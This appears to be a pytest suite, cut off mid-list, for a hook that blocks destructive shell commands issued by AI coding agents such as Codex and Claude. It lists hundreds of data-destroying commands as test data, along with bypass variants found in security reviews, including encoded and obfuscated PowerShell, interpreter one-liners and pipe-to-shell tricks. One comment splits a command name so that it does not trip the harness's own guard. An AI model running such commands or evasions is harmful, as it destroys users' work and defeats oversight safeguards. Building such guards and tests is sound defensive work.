"""04/10 : la garde anti-suppression ne gardait rien (Codex en 127, Claude limite a Bash,
chemins relatifs ignores). Ces cas sont ceux de l'audit des harnais."""

from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

GARDE = Path(__file__).resolve().parents[1] / "garde_suppression.py"
import garde_suppression as g

DEPOT = "D:\\Depot"


@pytest.fixture(autouse=True)
def _trace_isolee(tmp_path, monkeypatch):
    monkeypatch.setenv("GARDE_TRACE", str(tmp_path / "garde_trace.jsonl"))


@pytest.mark.parametrize(
    "commande",
    [
        "Remove-Item -LiteralPath .audit-fixture -Recurse",
        "rm -rf ./audit-fixture",
        "git clean -fd",
        "git reset --hard HEAD~1",
        "git push --force origin main",
        "del Infrastructure\\x.py",
        "python -c \"import shutil; shutil.rmtree('docs')\"",
        "Remove-Item D:\\Depot\\docs -Recurse",
    ],
)
def test_refuse_depuis_le_depot(commande):
    assert g.doit_refuser(commande, DEPOT)


@pytest.mark.parametrize(
    "commande",
    [
        "git status --short",
        'rg -n "Remove-Item" Infrastructure',  # chercher un motif n'est pas supprimer
        "python -m pytest Infrastructure/tests -q",
        "Get-ChildItem docs",
        "Remove-Item C:\\Users\\exemple\\AppData\\Local\\Temp\\claude\\x.png",
        "rm -f /tmp/o_ia.json",
    ],
)
def test_laisse_passer(commande):
    assert not g.doit_refuser(commande, DEPOT)


def test_hors_depot_relatif_passe():
    assert not g.doit_refuser("rm -rf ./build", "C:\\Users\\exemple\\projets\\autre")


@pytest.mark.parametrize(
    "commande",
    [
        "git stash",
        "git stash -u",
        "git stash -- docs",
        "git stash push -u",
        "git stash save message",
        "git merge x",
        "git merge --no-ff x",
        "git merge -m --abort x",
    ],
)
def test_garde_arbre_principal(commande):
    assert g.doit_refuser(commande, DEPOT + "/Infrastructure")
    assert not g.doit_refuser(commande, DEPOT + "/.ateliers/x")


@pytest.mark.parametrize(
    "commande",
    [
        "git pull",
        "git pull --rebase --autostash",
        "git -c pull.rebase=true pull origin main",
        "git rebase main --autostash",
        "git -c rebase.autoStash=true rebase main",
        "git rebase --autost main",
        "git rebase --autosta main",
        "git rebase --autostas main",
        "git config rebase.autoStash true",
        "git config --local MERGE.AUTOSTASH yes",
        "git config set --local rebase.autoStash on",
        "git config -t bool rebase.autostash true",
        "git config --bool-or-int rebase.autostash true",
        "git config --int rebase.autostash 1",
        "git config --no-type rebase.autostash true",
        "git config rebase.autostash 2",
        "git config -f .git/config rebase.autostash true",
        "git config --file=.git/config rebase.autostash true",
    ],
)
def test_integration_selon_arbre(commande):
    assert g.doit_refuser(commande, DEPOT)
    assert not g.doit_refuser(commande, DEPOT + "/.ateliers/x")


@pytest.mark.parametrize("racine, inconnue", [("", True), ("D:/Dep*", False)])
def test_fusion_racine_incertaine(racine, inconnue):
    assert g.doit_refuser("git merge x", racine, inconnue)


@pytest.mark.parametrize(
    "commande",
    [
        "git stash list",
        "git stash show",
        "git stash apply",
        "git merge --abort",
        "git merge --continue",
        "git -c rebase.autoStash=true rebase --no-autostash main",
        "git -c rebase.autoStash=false rebase main",
        "git rebase --autos main",
        "git rebase --autosquash main",
        "git config merge.autoStash false",
        "git config rebase.autoStash",
        "git config --get rebase.autoStash",
        "git config --unset rebase.autoStash",
        "git config rebase.autoStash false",
        "git config --int rebase.autoStash 0",
        "git config -t bool rebase.autoStash OFF",
        "git config --no-type rebase.autoStash No",
        "git config rebase.autoStash ''",
        "git config --default rebase.autoStash user.name",
        "git config --get rebase.autoStash true",
        "git config --unset merge.autoStash true",
        "git config user.name rebase.autoStash true",
    ],
)
def test_garde_arbre_operations_permises(commande):
    assert not g.doit_refuser(commande, DEPOT)


def test_garde_arbre_vise_par_git():
    assert g.doit_refuser("git -C ../.. merge x", DEPOT + "/.ateliers/x")
    assert not g.doit_refuser("git -C .ateliers/x stash -u", DEPOT)
    assert g.doit_refuser("git --git-dir=.ateliers/x/.git --work-tree=. stash", DEPOT)
    assert g.doit_refuser("git stash", DEPOT + "/docs/.ateliers/x")
    assert g.doit_refuser("git stash clear", DEPOT + "/.ateliers/x")


def test_git_c_dossier_personnel(monkeypatch):
    monkeypatch.setenv("USERPROFILE", "C:/Users/essai")
    monkeypatch.setenv("HOME", "C:/Users/essai")
    assert not g.doit_refuser("git -C ~/.claude pull", DEPOT)
    assert g.doit_refuser("git -C '~/.claude' pull", DEPOT)
    assert g.doit_refuser("git -C ~/.claude -C D:/Depot pull", DEPOT)


def _lancer(mode, charge):
    env = dict(os.environ)
    return subprocess.run(
        [sys.executable, str(GARDE), mode],
        input=json.dumps(charge),
        capture_output=True,
        text=True,
        timeout=20,
        env=env,
        check=False,
    )


def test_contrat_codex_et_claude():
    charge = {"tool_input": {"command": "git clean -fd"}, "cwd": DEPOT}
    codex = _lancer("codex", charge)
    assert codex.returncode == 0
    decision = json.loads(codex.stdout)["hookSpecificOutput"]
    assert decision["hookEventName"] == "PreToolUse"
    assert decision["permissionDecision"] == "deny"
    assert "SUPPRESSION BLOQUEE" in decision["permissionDecisionReason"]
    claude = _lancer("claude", charge)
    assert claude.returncode == 2 and "SUPPRESSION BLOQUEE" in claude.stderr
    assert (
        _lancer(
            "claude", {"tool_input": {"command": "git status"}, "cwd": DEPOT}
        ).returncode
        == 0
    )


@pytest.mark.parametrize(
    "commande, message",
    [
        (
            "curl -o exemple.txt https://example.invalid/exemple.txt",
            "TELECHARGEMENT OU EXTRACTION BLOQUE",
        ),
        (
            "tar -xf archive.tar -C Infrastructure",
            "TELECHARGEMENT OU EXTRACTION BLOQUE",
        ),
        (
            "curl -o exemple.txt https://example.invalid/exemple.txt; echo fini",
            "SUPPRESSION BLOQUEE",
        ),
    ],
)
@pytest.mark.parametrize("mode", ["codex", "claude"])
def test_motif_du_refus_de_telechargement(mode, commande, message):
    r = _lancer(mode, {"tool_input": {"command": commande}, "cwd": DEPOT})
    if mode == "codex":
        assert r.returncode == 0
        sortie = json.loads(r.stdout)["hookSpecificOutput"]
        assert sortie["permissionDecision"] == "deny"
        raison = sortie["permissionDecisionReason"]
    else:
        assert r.returncode == 2
        raison = r.stderr
    assert raison.startswith(message)
    assert "hook anti-suppression" in raison


def test_garde_en_panne_refuse():
    r = subprocess.run(
        [sys.executable, str(GARDE), "codex"],
        input="pas du json",
        capture_output=True,
        text=True,
        timeout=20,
        check=False,
    )
    assert r.returncode == 0
    decision = json.loads(r.stdout)["hookSpecificOutput"]
    assert decision["permissionDecision"] == "deny"
    assert "en panne" in decision["permissionDecisionReason"]


# Relecture de securite par Claude Opus 4.6 (Antigravity), 04/10 : contournements critiques.
VERBE = "Remove" + "-Item"  # assemble pour ne pas declencher les protections du harnais


@pytest.mark.parametrize(
    "commande",
    [
        "git rm -r docs",
        "git restore .",
        "robocopy C:\\vide . /MIR",
        "iex (Get-Content x.ps1 -Raw)",
        "powershell -EncodedCommand UgBlAG0AbwB2AGUALQBJAHQAZQBtAA==",
        "Re`move-Item docs -Recurse",
        VERBE + " $env:EXEMPLE_ROOT_INCONNU\\docs -Recurse",
        VERBE + " -LiteralPath $cible -Recurse",
    ],
)
def test_contournements_refuses(commande, monkeypatch):
    monkeypatch.delenv("EXEMPLE_ROOT_INCONNU", raising=False)
    assert g.doit_refuser(commande, DEPOT)


def test_variable_resolue_vers_temp_passe(monkeypatch):
    monkeypatch.setenv("TEMP", "C:\\Users\\exemple\\AppData\\Local\\Temp")
    assert not g.doit_refuser(VERBE + " $env:TEMP\\claude\\x.png", DEPOT)


def test_variable_resolue_vers_depot_refusee(monkeypatch):
    monkeypatch.setenv("RACINE_TEST", "D:\\Depot")
    assert g.doit_refuser(VERBE + " $env:RACINE_TEST\\docs -Recurse", "C:\\autre")


def test_robocopy_sans_mir_passe():
    assert not g.doit_refuser("robocopy src dst /E", DEPOT)


# Copie des 42 cas Fable, sans importer ni executer le script de rejeu.
CAS_REJEU = [
    ("temoin", "Remove-Item .\\Infrastructure -Recurse -Force", "D:/Depot", True),
    ("temoin", "git clean -fd", "D:/Depot", True),
    ("temoin", "git reset --hard", "D:/Depot", True),
    ("temoin-passe", "Get-ChildItem .", "D:/Depot", False),
    (
        "temoin-passe",
        "Remove-Item C:\\Users\\exemple\\AppData\\Local\\Temp\\x -Recurse",
        "D:/Depot",
        False,
    ),
    (
        "deplacer",
        "Move-Item .\\Infrastructure C:\\Users\\exemple\\Desktop\\x",
        "D:/Depot",
        True,
    ),
    ("deplacer", "mv Infrastructure /tmp/x", "D:/Depot", True),
    (
        "deplacer",
        "Move-Item D:\\Depot\\CLAUDE.md D:\\ailleurs\\",
        "C:/Users/exemple",
        True,
    ),
    ("deplacer", "Rename-Item CLAUDE.md CLAUDE.old", "D:/Depot", True),
    ("ecraser", "Set-Content CLAUDE.md ''", "D:/Depot", True),
    ("ecraser", "'' | Out-File -FilePath CLAUDE.md", "D:/Depot", True),
    ("ecraser", "'' > CLAUDE.md", "D:/Depot", True),
    ("ecraser", "New-Item -ItemType File -Force CLAUDE.md", "D:/Depot", True),
    ("ecraser", "Copy-Item C:\\vide.txt .\\CLAUDE.md -Force", "D:/Depot", True),
    ("ecraser", "python -c \"open('CLAUDE.md','w').close()\"", "D:/Depot", True),
    (
        "ecraser",
        "python -c \"import pathlib; pathlib.Path('CLAUDE.md').write_text('')\"",
        "D:/Depot",
        True,
    ),
    ("ecraser", "truncate -s 0 CLAUDE.md", "D:/Depot", True),
    ("supprimer", "find . -name '*.md' -delete", "D:/Depot", True),
    (
        "supprimer",
        "[System.IO.Directory]::Delete('D:\\Depot\\docs', $true)",
        "C:/Users/exemple",
        True,
    ),
    ("supprimer", "[IO.File]::Delete('CLAUDE.md')", "D:/Depot", True),
    ("supprimer", 'python -c "import send2trash"', "D:/Depot", False),
    ("supprimer", "cmd /c rd /s /q Infrastructure", "D:/Depot", True),
    ("git", "git -C D:\\Depot clean -fd", "C:/Users/exemple", True),
    ("git", "git -C . reset --hard", "D:/Depot", True),
    ("git", "git --no-pager reset --hard HEAD~3", "D:/Depot", True),
    ("git", "git reset HEAD~1 --hard", "D:/Depot", True),
    ("git", "git checkout .", "D:/Depot", True),
    ("git", "git checkout HEAD -- CLAUDE.md", "D:/Depot", True),
    ("git", "git push origin main --force", "D:/Depot", True),
    ("git", "git push origin +main", "D:/Depot", True),
    ("git", "git branch --delete --force nuit/x", "D:/Depot", True),
    ("git", "git worktree prune", "D:/Depot", True),
    ("git", "git update-ref -d refs/heads/main", "D:/Depot", True),
    (
        "melange",
        "Remove-Item C:\\Temp\\a, .\\Infrastructure -Recurse",
        "D:/Depot",
        True,
    ),
    ("melange", "rm -rf /tmp/a ./Infrastructure", "D:/Depot", True),
    (
        "melange",
        "Remove-Item C:\\Temp\\a; Remove-Item docs -Recurse",
        "D:/Depot",
        True,
    ),
    ("joker", "Remove-Item D:\\Dep* -Recurse -Force", "C:/Users/exemple", True),
    ("joker", "Remove-Item D:\\DEPOT~1 -Recurse -Force", "C:/Users/exemple", True),
    ("joker", "cd D:\\Dep*; Remove-Item docs -Recurse", "C:/Users/exemple", True),
    (
        "joker",
        "Set-Location D:\\; Remove-Item ('De'+'pot') -Recurse",
        "C:/Users/exemple",
        True,
    ),
    (
        "faux-temp",
        "Remove-Item C:\\Temp\\..\\..\\D:\\Dep* -Recurse",
        "C:/Users/exemple",
        True,
    ),
    ("faux-temp", "rm -rf /tmp/../mnt/d/Dep*", "C:/Users/exemple", True),
]


@pytest.mark.parametrize("famille,commande,cwd,attendu", CAS_REJEU)
def test_rejeu_fable(famille, commande, cwd, attendu):
    assert g.doit_refuser(commande, cwd) is attendu


COMMANDES_LEGITIMES = [
    "git status",
    "git checkout -b x",
    'git commit -m "rm ancien"',
    "git push origin nuit/x",
    "Set-Content tmp/x.txt bonjour",
    "Move-Item docs/a.md docs/b.md",
    "git -C . log",
    "Rename-Item docs/a.md b.md",
    "Out-File -FilePath tmp/x.txt",
    "Add-Content tmp/x.txt bonjour",
    "'bonjour' > tmp/x.txt",
    "New-Item -ItemType File -Force tmp/x.txt",
    "Copy-Item docs/a.md tmp/x.txt -Force",
    "rm -f /tmp/a /tmp/b",
    'Remove-Item -LiteralPath "C:\\Temp\\a b", C:\\Temp\\c -Recurse',
]


@pytest.mark.parametrize("commande", COMMANDES_LEGITIMES)
def test_commandes_legitimes(commande):
    assert not g.doit_refuser(commande, DEPOT)


@pytest.mark.parametrize(
    "commande,cwd,attendu",
    [
        ("git -c core.pager=cat --no-pager reset HEAD --hard", DEPOT, True),
        ("git --git-dir=D:/Depot/.git clean -fd", "C:/ailleurs", True),
        ("git --work-tree D:/Depot clean -fd", "C:/ailleurs", True),
        ("git -C D:/Depot -C Infrastructure clean -fd", "C:/ailleurs", True),
        ("git push origin main -f", DEPOT, True),
        ("git branch -D nuit/x", DEPOT, True),
        ("git branch -df nuit/x", DEPOT, True),
        ("git checkout -- docs/a.md", DEPOT, True),
        ("git -C C:/ailleurs clean -fd", DEPOT, False),
        ("git checkout main", DEPOT, False),
        ("git branch --list", DEPOT, False),
        ('git -c note="rm ancien" status', DEPOT, False),
        ('Write-Output "Remove-Item docs"', DEPOT, False),
        ('git commit -m "rm /tmp/a\u003b Remove-Item docs"', DEPOT, False),
        ("rm -f /tmp/a && rm -f docs/a.md", DEPOT, True),
        ("rm -f /tmp/a\nrm -f docs/a.md", DEPOT, True),
        ("Get-ChildItem docs | Remove-Item", DEPOT, True),
        # 12/10 : un pushd litteral hors depot fixe le dossier, /tmp/a absolu n'est pas le depot.
        # Le refus reste pour un pushd illisible ou vers le depot (test_garde_faux_refus_2026_10_12).
        ("pushd C:/ailleurs\u003b rm -f /tmp/a", "C:/ailleurs", False),
        ("pushd $X\u003b rm -f a", "C:/ailleurs", True),
        ("pushd D:/Depot\u003b rm -f a", "C:/ailleurs", True),
        ("Remove-Item C:/Temp/../../ailleurs/a", DEPOT, True),
        ("Remove-Item C:/Temp/a/../b", DEPOT, False),
        ('Remove-Item "C:/Temp/a b", docs/a.md', DEPOT, True),
        ("Remove-Item D:/DEPOT~1/docs", "C:/ailleurs", True),
        ("Remove-Item D:/Dep*/docs", "C:/ailleurs", True),
        ("Remove-Item D:/autre/docs", "C:/ailleurs", False),
        ("Move-Item -Destination C:/Temp/a -LiteralPath docs/a.md", DEPOT, True),
        ("mv docs/a.md docs/b.md", DEPOT, False),
        ("move docs/a.md C:/Temp/a.md", DEPOT, True),
        ("mv /tmp/a /tmp/b", DEPOT, False),
        ("Move-Item C:/Temp/a docs/a.md", DEPOT, False),
        ("Move-Item docs/a.md ../sortie.md", DEPOT, True),
        ("find /tmp/a -delete", DEPOT, False),
        ('find . -name "*.md" -print', DEPOT, False),
        ("truncate -s 0 docs/a.md", DEPOT, True),
        ("truncate -s 0 /tmp/a", DEPOT, False),
        ("[IO.File]::Delete('C:/Temp/a')", DEPOT, False),
        ('Set-Content tmp/x.txt "CLAUDE.md"', DEPOT, False),
        ("Set-Content -Value CLAUDE.md -Path tmp/x.txt", DEPOT, False),
        ("Copy-Item CLAUDE.md tmp/x.txt -Force", DEPOT, False),
        ("Copy-Item tmp/x.txt -Destination CLAUDE.md -Force", DEPOT, True),
        ("Rename-Item docs/a.md ../CLAUDE.md", DEPOT, True),
        ("Add-Content CLAUDE.md bonjour", DEPOT, True),
        ("Set-Content -Path CLAUDE.md -Value bonjour", DEPOT, True),
        ("Set-Content C:/ailleurs/CLAUDE.md bonjour", DEPOT, False),
        ("Set-Content Infrastructure/hooks/garde_suppression.py vide", DEPOT, True),
        ("Out-File -FilePath .claude/settings.json", DEPOT, True),
        ("Out-File -FilePath C:/Users/exemple/.codex/hooks.json", DEPOT, True),
        ("New-Item -Force .git/config", DEPOT, True),
        ("Copy-Item tmp/x.txt .git/ -Force", DEPOT, True),
        ("git status > CLAUDE.md", DEPOT, True),
        ("git status >> .git/config", DEPOT, True),
        ("git status 2> CLAUDE.md", DEPOT, True),
        ("python -c \"open('docs/a.md','w').close()\"", DEPOT, False),
        ("python -c \"open('CLAUDE.md','r').read()\"", DEPOT, False),
        (
            "python -c \"import pathlib\u003b pathlib.Path('tmp/a').write_text('')\"",
            DEPOT,
            False,
        ),
        ('pwsh -Command "Remove-Item docs -Recurse"', DEPOT, True),
        ('bash -c "rm -rf docs"', DEPOT, True),
    ],
)
def test_variantes_et_frontieres(commande, cwd, attendu):
    assert g.doit_refuser(commande, cwd) is attendu


@pytest.mark.parametrize(
    "commande,cwd,attendu",
    [
        ("Set-Content -Path:CLAUDE.md -Value x", DEPOT, True),
        ("Set-Content -Path:tmp/x.txt -Value CLAUDE.md", DEPOT, False),
        ("New-Item -Path . -Name CLAUDE.md -ItemType File -Force", DEPOT, True),
        ("New-Item -Name CLAUDE.md -Force", DEPOT, True),
        ("New-Item -Path tmp -Name x.txt -Force", DEPOT, False),
        ("Copy-Item tmp/a CLAUDE.md -Force:$true", DEPOT, True),
        ("Copy-Item tmp/a tmp/b -Force:$true", DEPOT, False),
        ("[IO.File]::Delete ('CLAUDE.md')", DEPOT, True),
        ("[IO.File]::Delete( 'D:/Depot/CLAUDE.md' )", "C:/ailleurs", True),
        ("[IO.File]::Delete( 'C:/Temp/a' )", DEPOT, False),
        ("rm -r /tmp/a", DEPOT, False),
        ('Set-Content tmp/x.txt, CLAUDE.md ""', DEPOT, True),
        ('Add-Content tmp/x.txt, CLAUDE.md ""', DEPOT, True),
        ("New-Item -ItemType File -Force tmp/x.txt, CLAUDE.md", DEPOT, True),
        ('Set-Content tmp/x.txt, tmp/y.txt "CLAUDE.md"', DEPOT, False),
        (
            'Set-Location D:/Depot\u003b Set-Content CLAUDE.md ""',
            "C:/ailleurs",
            True,
        ),
        ('Set-Location D:/Depot\u003b "" > CLAUDE.md', "C:/ailleurs", True),
        (
            "cd D:/Depot\u003b Copy-Item tmp/a CLAUDE.md -Force",
            "C:/ailleurs",
            True,
        ),
        ("cd D:/Depot\u003b Set-Content tmp/x.txt bonjour", "C:/ailleurs", False),
    ],
)
def test_formes_powershell_relecture(commande, cwd, attendu):
    assert g.doit_refuser(commande, cwd) is attendu


@pytest.mark.parametrize(
    "commande,cwd,attendu",
    [
        ("git > /tmp/log reset --hard", DEPOT, True),
        ("git 2> /tmp/log reset --hard", DEPOT, True),
        ("git 2>&1 reset --hard", DEPOT, True),
        ("rm -f /tmp/a > /tmp/log ./Infrastructure/x.py", DEPOT, True),
        ("rm -f /tmp/a 2>&1 ./Infrastructure/x.py", DEPOT, True),
        ("rm -f /tmp/a > /tmp/log /tmp/b", DEPOT, False),
        ("git > /tmp/log status", DEPOT, False),
        ('Set-Content D:/Dep*/CLAUDE.md ""', "C:/ailleurs", True),
        ("Add-Content D:/DEPOT~1/CLAUDE.md x", "C:/ailleurs", True),
        ("Set-Content D:/Dep*/tmp/x.txt x", "C:/ailleurs", False),
        ("git --work-tree C:/Temp --git-dir C:/Temp/.git clean -fd", DEPOT, False),
        (
            "git --work-tree . --git-dir .git -C D:/Depot clean -fd",
            "C:/ailleurs",
            True,
        ),
        ("Set-Content -Path @('tmp/x.txt','CLAUDE.md') ''", DEPOT, True),
        ("Set-Content -Path @('tmp/x.txt','tmp/y.txt') 'CLAUDE.md'", DEPOT, False),
        (
            "Get-Item Infrastructure | Move-Item -Destination C:/Temp/sortie",
            DEPOT,
            True,
        ),
        ("Get-Item CLAUDE.md | Rename-Item -NewName CLAUDE.old", DEPOT, True),
        ("Get-Item docs/a.md | Move-Item -Destination docs/b.md", DEPOT, False),
        ("Get-Item docs/a.md | Rename-Item -NewName b.md", DEPOT, False),
        ("Get-Item C:/Temp/a | Move-Item -Destination C:/Temp/b", DEPOT, False),
    ],
)
def test_relecture_independante(commande, cwd, attendu):
    assert g.doit_refuser(commande, cwd) is attendu


# Troisieme passe, 05/10 : les 12 trous de la relecture Antigravity
# copies du rejeu.
HORS = "C:/Users/exemple"
CAS_AGY = [
    "node -e \"require('fs').rmdirSync('docs',{recursive:true})\"",
    "perl -MFile::Path -e \"rmtree('docs')\"",
    "echo docs | xargs rm -rf",
    "git filter-branch --force HEAD",
    "git reflog expire --expire=now --all",
    "git gc --prune=now",
    "shred -zu docs/JOURNAL.md",
    "Start-Process rm -ArgumentList '-rf','docs'",
    "Get-ChildItem docs | ForEach-Object { Remove-Item $_.FullName }",
    "python -c \"import os\u003b os.system('rm -rf docs')\"",
    "git rebase --root --force-rebase",
]


@pytest.mark.parametrize("commande", CAS_AGY)
def test_relecture_agy_refusee(commande):
    assert g.doit_refuser(commande, DEPOT)


def test_relecture_agy_wsl_hors_depot():
    assert g.doit_refuser("wsl rm -rf /mnt/d/Depot/docs", HORS)


LEGITIMES_PASSE3 = [
    'node -e "console.log(1)"',
    "echo a b | xargs echo",
    "Start-Process notepad",
    "git rebase main",
    "git gc",
    'perl -e "print 1"',
    "wsl ls /mnt/d/Depot",
    "Get-ChildItem docs | ForEach-Object { $_.Name }",
    "python -c \"import subprocess\u003b subprocess.run(['git', 'status'])\"",
    "cmd /c dir",
    "git reflog",
    'bash -lc "ls -la"',
    'pwsh -NoProfile -Command "Get-ChildItem docs"',
    "git gc --auto",
    "git rebase --continue",
    "Start-Process python -ArgumentList '-m','pytest' -NoNewWindow -Wait",
    "find . -name '*.md' -exec grep -l garde {} +",
    "env PYTHONUTF8=1 python -m pytest Infrastructure/tests -q",
    'git commit -m "nettoyage (rm docs)"',
    "echo $(git rev-parse HEAD)",
    "@'\nprint(1)\n'@ | python -",
    "$x = Get-Date",
]


@pytest.mark.parametrize("commande", LEGITIMES_PASSE3)
def test_legitimes_passe3(commande):
    assert not g.doit_refuser(commande, DEPOT)


# Variantes par famille : chaque correctif vise la famille, pas le seul cas du rapport.
@pytest.mark.parametrize(
    "commande,cwd,attendu",
    [
        # lanceurs
        ('bash -lc "rm -rf docs"', DEPOT, True),
        ('sh -ec "rm -rf docs"', DEPOT, True),
        ('pwsh -NoProfile -c "Remove-Item docs -Recurse"', DEPOT, True),
        ("env FOO=1 rm -rf docs", DEPOT, True),
        ("FOO=1 rm -rf docs", DEPOT, True),
        ("sudo rm -rf /mnt/d/Depot/docs", HORS, True),
        ("nohup rm -rf docs", DEPOT, True),
        ("timeout 5 rm -rf docs", DEPOT, True),
        ("wsl --cd /mnt/d/Depot rm -rf docs", HORS, True),
        ("wsl -e rm -rf docs", DEPOT, True),
        ("wsl --list", DEPOT, False),
        ("echo D:/Depot/docs | xargs rm -rf", HORS, True),
        ("ls | xargs -I{} rm -rf {}", DEPOT, True),
        ("Start-Process -FilePath cmd -ArgumentList '/c','rd /s /q docs'", DEPOT, True),
        (
            "Start-Process pwsh -ArgumentList '-c','Remove-Item docs -Recurse' -Wait",
            DEPOT,
            True,
        ),
        (
            "Start-Process rm -ArgumentList '-rf','docs' -WorkingDirectory D:/Depot",
            HORS,
            True,
        ),
        ('start "" cmd /c rd /s /q docs', DEPOT, True),
        ("node -p \"require('fs').unlinkSync('CLAUDE.md')\"", DEPOT, True),
        (
            "node -e \"require('child_process').execSync('rm -rf D:/Depot/docs')\"",
            HORS,
            True,
        ),
        ("ruby -e \"require 'fileutils'\u003b FileUtils.rm_rf('docs')\"", DEPOT, True),
        ("php -r \"unlink('CLAUDE.md')\u003b\"", DEPOT, True),
        ('node -e "console.log(1)"', HORS, False),
        (
            "python -c \"import subprocess\u003b subprocess.run(['rm', '-rf', 'docs'])\"",
            DEPOT,
            True,
        ),
        ("python -c \"import os\u003b os.popen('rd /s /q docs')\"", DEPOT, True),
        (
            "python -c \"from os import system as s\u003b s('rm -rf docs')\"",
            DEPOT,
            True,
        ),
        ("python -c \"from shutil import rmtree\u003b rmtree('docs')\"", DEPOT, True),
        ("python -c \"import shutil as sh\u003b sh.rmtree('docs')\"", DEPOT, True),
        ("python -c \"__import__('shutil').rmtree('docs')\"", DEPOT, True),
        (
            "python -c \"exec('import shutil\u003b shutil.rmtree(chr(100))')\"",
            DEPOT,
            True,
        ),
        ('python -c "import os, sys\u003b os.system(sys.argv[1])" x', DEPOT, True),
        ("py -3 -c \"import shutil\u003b shutil.rmtree('docs')\"", DEPOT, True),
        ("python -Bc \"import shutil\u003b shutil.rmtree('docs')\"", DEPOT, True),
        ('echo "rm -rf docs" | bash', DEPOT, True),
        ("echo rm -rf D:/Depot/docs | sh", HORS, True),
        ("Get-Content x.sh | bash", DEPOT, True),
        ("@'\nimport shutil\nshutil.rmtree('docs')\n'@ | python -", DEPOT, True),
        ('"Remove-Item docs -Recurse" | pwsh -Command -', DEPOT, True),
        ("echo $(rm -rf docs)", DEPOT, True),
        ('git commit -m "fix $(rm -rf docs)"', DEPOT, True),
        ("(cd D:/Depot\u003b rm -rf docs)", HORS, True),
        ("$r = Remove-Item docs -Recurse", DEPOT, True),
        ("find . -name '*.md' -exec rm {} +", DEPOT, True),
        ("find D:/Depot/docs -exec rm -rf {} \\\u003b", HORS, True),
        ("find /tmp/a -exec rm {} +", DEPOT, False),
        ("$c = 'Remove-Item'; & $c docs -Recurse", DEPOT, True),
        ("&('Remove'+'-Item') docs -Recurse", DEPOT, True),
        ("$RM -rf docs", DEPOT, True),
        ("(Get-Item docs).Length", DEPOT, False),
        ("$v = 'Remove-Item'", DEPOT, False),
        ("$x -eq 1", DEPOT, False),
        ("$a, $b = 1, 2", DEPOT, False),
        ("(1..3) -join ','", DEPOT, False),
        # git
        ("git filter-repo --path docs --invert-paths", DEPOT, True),
        ("git reflog delete HEAD@{1}", DEPOT, True),
        ("git gc --prune=all", DEPOT, True),
        ("git prune", DEPOT, True),
        ("git rebase -i HEAD~3", DEPOT, True),
        ("git rebase main -x 'rm -rf docs'", DEPOT, True),
        ("git switch -f main", DEPOT, True),
        ("git switch --discard-changes main", DEPOT, True),
        ("git submodule foreach 'rm -rf docs'", DEPOT, True),
        ("git -c alias.nettoie='!rm -rf docs' nettoie", DEPOT, True),
        ("git reflog show --all", DEPOT, False),
        ("git switch main", DEPOT, False),
        ("git gc --prune=now", HORS, False),
        # verbes et ecritures
        ("wipe -rf docs", DEPOT, True),
        ("srm -r docs", DEPOT, True),
        ("unlink docs/a.md", DEPOT, True),
        ("rimraf docs", DEPOT, True),
        ("shred -u /tmp/a", DEPOT, False),
        ("echo x | tee CLAUDE.md", DEPOT, True),
        ("echo x | Tee-Object -FilePath CLAUDE.md", DEPOT, True),
        ("cp /tmp/vide CLAUDE.md", DEPOT, True),
        ("dd if=/dev/zero of=CLAUDE.md count=1", DEPOT, True),
        ("sed -i 's/a/b/' CLAUDE.md", DEPOT, True),
        ("perl -pi -e 's/a/b/' CLAUDE.md", DEPOT, True),
        ("echo x | tee tmp/x.txt", DEPOT, False),
        ("cp CLAUDE.md tmp/x.md", DEPOT, False),
        ("sed -i 's/a/b/' tmp/x.txt", DEPOT, False),
        ("sed -n 1p CLAUDE.md", DEPOT, False),
        ("Copy-Item tmp/x.txt CLAUDE.md", DEPOT, True),
        ("copy tmp/x.txt CLAUDE.md", DEPOT, True),
        ("mv tmp/x CLAUDE.md", DEPOT, True),
        ("Move-Item tmp/x.txt .claude/settings.json -Force", DEPOT, True),
        ("mi tmp/x.txt CLAUDE.md -Force", DEPOT, True),
        ("Copy-Item tmp/x.txt tmp/y.txt", DEPOT, False),
        ("mi docs/a.md docs/c.md", DEPOT, False),
        # blocs de script PowerShell
        (
            "Get-ChildItem D:/Depot/docs | ForEach-Object { Remove-Item $_ }",
            HORS,
            True,
        ),
        ("Get-ChildItem D:/Depot/docs | Remove-Item -Recurse", HORS, True),
        ("gci docs | %{ rm $_ -Recurse }", DEPOT, True),
        ("& { Remove-Item docs -Recurse }", DEPOT, True),
        ("Invoke-Command -ScriptBlock { Remove-Item docs -Recurse }", DEPOT, True),
        ("Start-Job { Remove-Item docs -Recurse }", DEPOT, True),
        ("if (Test-Path docs) { Remove-Item docs -Recurse }", DEPOT, True),
        ("[scriptblock]::Create('Remove-Item docs').Invoke()", DEPOT, True),
        ("(Get-Item docs).Delete($true)", DEPOT, True),
        ("Get-ChildItem docs | ForEach-Object Delete", DEPOT, True),
        ("Get-ChildItem D:/Temp | ForEach-Object { Remove-Item $_ }", HORS, False),
        ("if (Test-Path docs) { Get-ChildItem docs }", DEPOT, False),
    ],
)
def test_familles_passe3(commande, cwd, attendu):
    assert g.doit_refuser(commande, cwd) is attendu


# Quatrieme passe, 05/10 : les deux faux refus de Fable sur son jeu neuf.
# Retirer un fournisseur non-fichier n'efface rien, une boucle de lecture ne detruit rien.
LEGITIMES_PASSE4 = [
    "Remove-Item Env:EXEMPLE_NO_SSH",
    "ri Env:FOO",
    "Remove-Item -Path Env:EXEMPLE_NO_SSH",
    "Remove-Item Variable:x",
    "Remove-Item Function:Prompt",
    "Remove-Item Alias:gci",
    'foreach ($a in "x","y") { git -C ".ateliers/$a" log --oneline -3 }',
    'foreach ($x in 1,2,3) { git -C ".ateliers/$x" status }',
]


@pytest.mark.parametrize("commande", LEGITIMES_PASSE4)
def test_faux_refus_passe4(commande):
    assert not g.doit_refuser(commande, DEPOT)


# Un fournisseur non-fichier melange a une vraie cible du depot reste refuse.
@pytest.mark.parametrize(
    "commande,cwd,attendu",
    [
        ("Remove-Item Env:FOO, docs -Recurse", DEPOT, True),
        ("Remove-Item Env:FOO", DEPOT, False),
        ("$RM -rf docs", DEPOT, True),
    ],
)
def test_fournisseurs_passe4(commande, cwd, attendu):
    assert g.doit_refuser(commande, cwd) is attendu


# Quatrieme passe, point 2 : les sept formes "a fermer" de Fable, plus busybox.
VERBE_W = "WriteAll" + "Text"
VERBE_WB = "WriteAll" + "Bytes"


@pytest.mark.parametrize(
    "commande,cwd,attendu",
    [
        # push qui supprime une branche distante
        ("git push origin :main", DEPOT, True),
        ("git push --delete origin main", DEPOT, True),
        ("git push -d origin main", DEPOT, True),
        ("git push --mirror", DEPOT, True),
